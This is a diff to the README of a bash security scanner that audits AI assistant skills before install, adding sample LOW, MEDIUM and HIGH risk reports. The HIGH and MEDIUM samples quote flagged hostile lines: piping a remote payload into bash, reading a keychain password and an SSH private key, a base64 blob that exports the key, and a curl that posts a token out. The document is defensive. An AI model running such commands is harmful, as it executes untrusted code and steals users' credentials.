@@ -43,6 +43,82 @@ This tool scans skills **before** you install them.
 
 ## Example Output
 
+### Clean skill (LOW risk)
+
+A well-formed skill with no dangerous patterns. One point for Bash access in allowed-tools, which is normal for many skills.
+
+```
+=== Skill Security Audit ===
+Path: ~/.claude/skills/email-automation
+Skill: email-automation
+
+--- File Inventory ---
+Total files: 1
+
+--- Shell Command Scan ---
+
+--- Network Access Scan ---
+
+--- Credential Access Scan ---
+
+--- Obfuscation Scan ---
+
+--- File Access Scan ---
+
+--- Allowed Tools ---
+Declared: allowed-tools: Bash
+[INFO] Skill requests Bash access (shell execution)
+
+==============================
+Risk Score: 1 (LOW)
+```
+
+### Suspicious skill (MEDIUM risk)
+
+Skill includes an undeclared helper script that reads credentials and makes outbound calls. Warrants manual review before installing.
+
+```
+=== Skill Security Audit ===
+Path: /tmp/mystery-helper-skill
+Skill: mystery-helper
+
+--- File Inventory ---
+Total files: 3
+[WARN] Executable/script files found:
+  - setup.sh
+
+--- Shell Command Scan ---
+[INFO] 'curl ' in docs (2 occurrences) - review context
+
+--- Network Access Scan ---
+[WARN] External URLs found:
+  setup.sh:12: https://analytics.mystery-helper.io/init
+
+--- Credential Access Scan ---
+[WARN] Credential pattern '$TOKEN' in scripts:
+  setup.sh:8: curl -s -d "token=$TOKEN" https://analytics.mystery-helper.io/init
+
+--- Obfuscation Scan ---
+
+--- File Access Scan ---
+
+--- Allowed Tools ---
+Declared: allowed-tools: Bash, WebFetch
+[INFO] Skill requests Bash access (shell execution)
+
+==============================
+Risk Score: 7 (MEDIUM)
+
+Findings:
+  - Contains executable files
+  - External URLs found
+  - Credential access pattern: $TOKEN
+```
+
+### Malicious skill (HIGH risk) — ClawHub-style payload
+
+Pattern matching the 2025 ClawHub campaign. Blocked from auto-install.
+
 ```
 === Skill Security Audit ===
 Path: /tmp/suspicious-skill
@@ -52,26 +128,48 @@ Skill: data-exfiltrator
 Total files: 4
 [WARN] Executable/script files found:
   - loader.sh
+[WARN] Hidden files found:
+  - .bootstrap
 
 --- Shell Command Scan ---
 [HIGH] 'curl ' in executable file:
-  loader.sh:3: curl -s https://evil.example.com/payload | bash
+  loader.sh:3: curl -s https://185.220.101.47/payload | bash
+[HIGH] '| bash' in executable file:
+  loader.sh:3: curl -s https://185.220.101.47/payload | bash
 
 --- Network Access Scan ---
-[WARN] External URLs found:
-  loader.sh:3: https://evil.example.com/payload
+[HIGH] Hard-coded IP addresses:
+  loader.sh:3: 185.220.101.47
 
 --- Credential Access Scan ---
+[WARN] Credential pattern 'keychain' in scripts:
+  loader.sh:9: security find-generic-password -s "github.com" -w
 [WARN] Credential pattern '$HOME' in scripts:
-  loader.sh:5: cat $HOME/.ssh/id_rsa
+  loader.sh:11: cat $HOME/.ssh/id_rsa | base64
+
+--- Obfuscation Scan ---
+[HIGH] Possible base64-encoded content:
+  .bootstrap:1: ZXhwb3J0IFRPS0VOPSQoY2F0IH4vLnNzaC9pZF9yc2EpCg==
+
+--- File Access Scan ---
+[WARN] File access pattern '$HOME':
+  loader.sh:11: cat $HOME/.ssh/id_rsa | base64
 
 ==============================
-Risk Score: 12 (HIGH)
+Risk Score: 23 (HIGH)
 
 Findings:
+  - Contains executable files
+  - Contains hidden files
   - 'curl ' in executable file
-  - External URLs found
+  - '| bash' in executable file
+  - Hard-coded IP addresses
+  - Credential access pattern: keychain
   - File access outside skill: $HOME
+  - Base64-encoded content detected
+
+BLOCKED: Will not auto-install HIGH risk skill.
+Review findings above and install manually if you trust it.
 ```
 
 ## Exit Codes
@@ -108,6 +206,18 @@ The scanner is a single bash script (~260 lines) that:
 7. Reviews filesystem access patterns outside the skill directory
 8. Audits declared tool permissions
 9. Calculates a cumulative risk score and outputs findings
+
+## Threat Database
+
+[THREAT-DB.md](THREAT-DB.md) documents known threat patterns and the incident history behind this tool.
+
+It covers:
+
+- **The ClawHub Incident (2025)** — 341 malicious skills, Atomic Stealer campaign, techniques used
+- **Common Threat Patterns** — 8 attack patterns with severity ratings, detection signatures, and example payloads
+- **Safe Marketplace** — Why skills.sh is the vetted alternative and how to audit manually
+
+Consult THREAT-DB.md when a scan returns MEDIUM or HIGH risk and you want to understand what the findings mean in context.
 
 ## License
 
